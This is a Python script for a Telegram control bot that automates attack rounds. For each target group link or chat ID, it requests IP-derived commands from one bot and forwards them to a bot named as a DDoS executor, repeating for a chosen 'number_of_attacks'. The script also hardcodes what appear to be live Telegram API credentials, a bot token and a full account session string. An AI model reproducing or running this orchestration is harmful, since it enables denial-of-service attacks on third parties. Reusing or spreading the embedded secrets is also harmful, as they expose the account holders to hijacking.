import threading
import asyncio
import re
from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

API_ID = 36295148
API_HASH = "bee66be844e3be0e314508e92a7c4e7d"
BOT_TOKEN = "8473172869:AAG1B8DvV4dwodGudTz11cBed2iq-DDReSY"

BOT_A = "@botbysahilbot"          # IP BOT
BOT_B = "@DDOS_Aditya_xd_bot"     # TASK EXECUTER BOT

STRING_SESSION = "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qUIIMziiQPAG5irsAx37rfUZra0WJqTRjSox2F7NSUqUi9_bSizm3sfw3Ez5GszsCnrgY7IVixINZgjWQobFkg4JmOePZb14z6XNO1e1oqNQ_oxugaQN0cBB3IWaH0BaY4G8-O4IfF3GsY_QIbFlLdJeLCxIA6Tah1SHTrTdK4reg_9Vig2snpHSri02cNdkoawDBk1QUyo3mL6r4v7uuO0b5w7LpwjCmJnvYUaWOH0uy14seFuaU4gSnQNvvz79sK_p8vQoZm6h2HLUIOwZLZRugWZ-_iRiaYiU="

tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)

# PTB side state
chat_targets: dict[int, str] = {}          # chat_id -> link_or_chatid
chat_counts: dict[int, int] = {}           # chat_id -> number of rounds
loop_tasks: dict[int, asyncio.Task] = {}   # chat_id -> loop task

# per chat future
ip_waiters: dict[int, asyncio.Future] = {}  # chat_id -> Future for CMD from BOT_A
bot_b_status = "UNKNOWN"


# -------- IP BOT LISTENER --------
@tele.on(events.NewMessage(from_users=BOT_A))
async def ip_bot_listener(event):
    text = event.text or ""
    print("📩 IP BOT REPLY:", text)

    # Correct regex: s* not s*
    m = re.search(r"CMD:s*(.+)", text)
    if not m:
        return

    final_cmd = m.group(1).strip()
    print("✅ FINAL CMD:", final_cmd)

    for chat_id, fut in list(ip_waiters.items()):
        if not fut.done():
            fut.set_result(final_cmd)
        ip_waiters.pop(chat_id, None)


# -------- BOT_B LISTENER --------
@tele.on(events.NewMessage(from_users=BOT_B))
async def bot_b_listener(event):
    global bot_b_status
    t = (event.text or "").lower()
    if "ready" in t:
        bot_b_status = "READY"
    elif "running" in t:
        bot_b_status = "RUNNING"
    elif "cooldown" in t:
        bot_b_status = "COOLDOWN"
    else:
        bot_b_status = "UNKNOWN"


# -------- CORE LOOP PER CHAT --------
async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    global bot_b_status

    target = chat_targets.get(chat_id)
    if not target:
        await context.bot.send_message(
            chat_id,
            "❌ Target not set, use /setlinkchatid first."
        )
        return

    count = chat_counts.get(chat_id, 1)

    # yaha pe pehle error aa raha tha -> ab triple quoted f-string
    await context.bot.send_message(
        chat_id,
        f'''🔁 Loop configured.
Target: `{target}`
Rounds: {count}''',
        parse_mode="Markdown",
    )

    for i in range(count):
        # 1) .getip all
        await context.bot.send_message(
            chat_id,
            f'''➡️ Round {i + 1}/{count}:
Sending `.getip all {target}` to IP BOT…''',
            parse_mode="Markdown",
        )

        fut = tele.loop.create_future()
        ip_waiters[chat_id] = fut

        await tele.send_message(BOT_A, f".getip all {target}")

        try:
            final_cmd = await asyncio.wait_for(fut, timeout=60)
        except asyncio.TimeoutError:
            await context.bot.send_message(
                chat_id,
                "⏱️ Timeout: No CMD from IP BOT, skipping this round…"
            )
            ip_waiters.pop(chat_id, None)
            continue

        await context.bot.send_message(
            chat_id,
            f'''📥 IP BOT CMD received:
`{final_cmd}`''',
            parse_mode="Markdown",
        )

        # 2) BOT_B READY
        await context.bot.send_message(
            chat_id,
            "🔎 Checking BOT_B `/status` until READY…"
        )

        while True:
            await tele.send_message(BOT_B, "/status")
            await asyncio.sleep(2)
            if bot_b_status == "READY":
                break
            await context.bot.send_message(
                chat_id,
                f'''⏸ BOT_B status: {bot_b_status} (waiting 5s…)'''
            )
            await asyncio.sleep(5)

        # 3) send CMD to BOT_B
        await tele.send_message(BOT_B, final_cmd)
        await context.bot.send_message(
            chat_id,
            f'''🚀 Sent to BOT_B:
`{final_cmd}`''',
            parse_mode="Markdown",
        )
        await asyncio.sleep(3)

    await context.bot.send_message(chat_id, "✅ All rounds finished.")
    loop_tasks.pop(chat_id, None)


# -------- PTB COMMANDS --------
async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "Usage: /setlinkchatid <group_link_or_chatid>"
        )
        return

    chat_targets[update.effective_chat.id] = " ".join(context.args)
    await update.message.reply_text("✅ Link / ChatID saved")


async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text(
            "Usage: /setcount <number_of_attacks>"
        )
        return

    n = max(1, int(context.args[0]))
    chat_counts[update.effective_chat.id] = n
    await update.message.reply_text(f"✅ Count set to {n}")


async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    if cid in loop_tasks:
        await update.message.reply_text("⚠️ Loop already running")
        return

    task = tele.loop.create_task(telethon_loop(cid, context))
    loop_tasks[cid] = task
    await update.message.reply_text("🔁 Loop started")


async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    task = loop_tasks.pop(cid, None)
    if task:
        task.cancel()
        await update.message.reply_text("🛑 Loop stopped")
    else:
        await update.message.reply_text("No active loop running")


# -------- TELETHON RUNNER --------
def start_telethon():
    asyncio.run(run_telethon())


async def run_telethon():
    await tele.start()
    print("🧵 Telethon connected")
    await tele.run_until_disconnected()


def main():
    t = threading.Thread(target=start_telethon, daemon=True)
    t.start()

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("setlinkchatid", setlink))
    app.add_handler(CommandHandler("setcount", setcount))
    app.add_handler(CommandHandler("startloop", startloop))
    app.add_handler(CommandHandler("stoploop", stoploop))

    print("🤖 Control bot running")
    app.run_polling()


if __name__ == "__main__":
    main()